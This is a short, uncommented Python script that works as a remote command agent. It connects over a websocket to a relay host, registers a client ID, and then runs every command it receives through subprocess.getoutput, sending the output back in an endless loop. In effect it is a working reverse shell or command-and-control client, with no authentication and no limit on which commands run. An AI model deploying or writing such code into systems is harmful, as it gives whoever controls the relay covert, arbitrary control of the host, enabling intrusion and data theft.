import websocket
import json
import subprocess
import platform
import time

CLIENT_ID = "client_001"
RELAY = "wss://8080-XXXX.cloudshell.dev"

def execute(cmd):
    if cmd == "PING":
        return "PONG"
    return subprocess.getoutput(cmd)

ws = websocket.create_connection(RELAY)
ws.send(json.dumps({
    "role": "client",
    "id": CLIENT_ID
}))

while True:
    msg = json.loads(ws.recv())
    cmd = msg["data"]
    result = execute(cmd)
    ws.send(result)
